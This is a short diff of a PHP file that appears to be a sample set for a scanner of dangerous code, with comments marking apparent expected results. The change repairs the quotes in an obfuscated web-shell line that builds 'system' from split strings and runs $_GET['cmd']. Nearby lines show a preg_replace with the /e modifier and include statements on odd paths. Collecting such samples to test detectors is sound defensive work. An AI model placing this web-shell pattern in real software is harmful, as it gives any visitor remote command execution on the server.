@@ -41,7 +41,7 @@ include_once "/2.php";    //pass
 require "/3.jpg";    //get is
 require_once dirname(__FILE__)."/4.inc";    //pass
 require_once("config.cache.inc.php");    //pass
-$func = “s”.”ystem”;
+$func = "s"."ystem";
 $func($_GET['cmd']);
 preg_replace('/test/ies', 'test', $func);
 preg_replace('/test/is', 'test', $func);
